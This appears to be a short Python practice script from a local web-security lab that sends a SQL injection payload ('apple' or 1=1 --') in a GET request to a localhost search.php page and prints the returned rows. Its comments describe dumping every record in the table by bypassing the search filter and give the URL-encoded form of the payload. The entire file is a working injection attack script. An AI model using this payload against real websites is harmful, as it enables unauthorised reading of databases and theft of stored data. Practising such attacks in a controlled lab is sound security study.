import requests

# Retrieve database data: Retrieve any data from the database
# in this attack , we managed to retrieve all the database record in the table ignoring the search function 

# Define the URL you want to send the GET request to
url = "http://localhost/sites/sql_injection/example2/search.php?name=apple' or 1=1 -- "

#the url with html encoding looks like this : http://localhost/www/sites/eh/sql_injection/example2/search.php?name=s' or 1=1 --%20
# %20 use to add space

# Send the GET request and get the response
response = requests.get(url)

# Check the response status code
if response.status_code == 200:
    # The request was successful, access the response content
    print(response.text)
else:
    # The request failed, handle the error
    print(f"Error: {response.status_code}")
